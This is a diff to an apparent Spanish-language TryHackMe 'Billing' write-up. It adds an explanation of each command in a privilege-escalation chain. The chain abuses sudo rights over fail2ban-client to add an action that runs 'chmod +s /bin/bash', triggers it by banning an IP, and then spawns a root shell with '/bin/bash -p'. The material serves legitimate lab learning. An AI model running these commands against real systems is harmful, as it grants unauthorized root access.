@@ -156,6 +156,33 @@ Maquinas a utilizar Kali Linux y https://tryhackme.com/room/billing
         
         `/bin/bash -p`
         
+        Explicación:
+
+        **1. `sudo /usr/bin/fail2ban-client status`**
+
+        **Muestra el estado actual** de Fail2ban: ves qué "jails" (reglas antisabotaje) están activas y estadísticas generales.
+
+        **2. `sudo /usr/bin/fail2ban-client get ast-cli-attck actions`**
+
+        **Consulta qué acciones están configuradas** en el jail llamado **`ast-cli-attck`** (por ejemplo, bloquear IP).
+
+        **3. `sudo /usr/bin/fail2ban-client set ast-cli-attck addaction evil`**
+
+        **Agrega** una acción con nombre “evil” al jail **`ast-cli-attck`**.
+
+        **4. `sudo /usr/bin/fail2ban-client set ast-cli-attck action evil actionban "chmod +s /bin/bash"`**
+
+        **Configura qué hace** la acción “evil” al banear: aquí haría el comando **`chmod +s /bin/bash`** (le da permisos especiales al ejecutable).
+
+        **5. `sudo /usr/bin/fail2ban-client set ast-cli-attck banip 1.2.3.5`**
+
+        **Banea manualmente** la IP 1.2.3.5 usando el jail **`ast-cli-attck`**.
+
+        **6. `/bin/bash -p`**
+
+        Ejecuta Bash **manteniendo privilegios** si tienes permisos elevados . 
+
+        
         ![image.png](./imagenes/Billing/image%2018.png)
         
     - Miramos el ID de nuestro usuario
